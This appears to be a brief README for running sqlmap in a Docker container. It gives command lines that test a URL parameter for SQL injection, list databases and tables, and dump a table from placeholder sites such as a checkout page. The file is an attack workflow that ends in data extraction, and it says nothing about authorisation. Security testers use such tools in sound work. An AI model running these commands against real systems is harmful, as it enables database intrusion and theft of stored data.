## RUN USING THIS COMMAND
docker run --rm -it sqlmap:1.0 --url www.example.com/?id=1
## to find basic vulnerabilities
docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10"

## to deeply inspect found exploitable point and get databasename
docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10" --dbs

## list tables from found databas databasename
docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10" -D databasename --tables

## dump table tablename from database databasename
docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10" -D databasename -T tablename --dump

### original script and command
https://github.com/paoloo/sqlmap
